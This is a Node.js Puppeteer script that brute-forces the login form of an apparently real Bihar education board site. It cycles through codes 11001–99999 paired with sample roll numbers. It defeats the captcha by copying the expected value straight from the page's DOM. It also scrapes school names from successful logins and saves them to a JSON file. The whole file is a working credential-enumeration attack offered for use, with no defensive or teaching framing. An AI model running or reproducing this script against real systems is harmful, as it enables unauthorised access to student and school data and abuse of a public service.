const puppeteer = require("puppeteer");
const fs = require("fs");

(async () => {

  const browser = await puppeteer.launch({
    headless: true,
    args: ["--no-sandbox", "--disable-setuid-sandbox"]
  });

  const page = await browser.newPage();

  // ⚡ block heavy resources
  await page.setRequestInterception(true);
  page.on("request", req => {
    if (["image", "stylesheet", "font"].includes(req.resourceType())) {
      req.abort();
    } else {
      req.continue();
    }
  });

  await page.goto("http://interbiharboard.com/", {
    waitUntil: "domcontentloaded"
  });

  const testRolls = ["26010013", "26010021", "26010033", "26010047"];

  let resultData = {};

  for (let code = 11001; code <= 99999; code++) {

    console.log("Checking:", code);

    let found = false;

    for (let roll of testRolls) {

      try {

        // clear fields
        await page.evaluate(() => {
          document.querySelector("#mobile").value = "";
          document.querySelector("#password").value = "";
        });

        await page.type("#mobile", String(code));
        await page.type("#password", roll);

        // captcha auto
        await page.evaluate(() => {
          const cap = document.getElementById("generatedCaptcha").dataset.value;
          document.getElementById("captchaInput").value = cap;
        });

        await page.click("#btn_login");

        await page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 5000 }).catch(() => {});

        const text = await page.evaluate(() => document.body.innerText);

        if (!text.includes("Invalid")) {

          const school = await page.evaluate(() => {
            const rows = Array.from(document.querySelectorAll("table tr"));
            for (let row of rows) {
              const tds = row.querySelectorAll("td");
              if (tds.length === 2 && tds[0].innerText.includes("School")) {
                return tds[1].innerText.trim();
              }
            }
            return "Unknown";
          });

          console.log(`✅ FOUND: ${code} - ${school}`);

          resultData[code] = school;

          found = true;
          break;
        }

      } catch (err) {
        console.log("Error:", code);
      }

    }

    // 💾 save every 20 results
    if (Object.keys(resultData).length % 20 === 0 && Object.keys(resultData).length !== 0) {
      fs.writeFileSync(
        "bseb-12th-college-list-2026.json",
        JSON.stringify(resultData, null, 2)
      );
      console.log("💾 Saved progress...");
    }

    // go back if navigated
    if (found) {
      await page.goto("http://interbiharboard.com/", { waitUntil: "domcontentloaded" });
    }

  }

  // final save
  fs.writeFileSync(
    "bseb-12th-college-list-2026.json",
    JSON.stringify(resultData, null, 2)
  );

  console.log("🎉 DONE");

  await browser.close();

})();
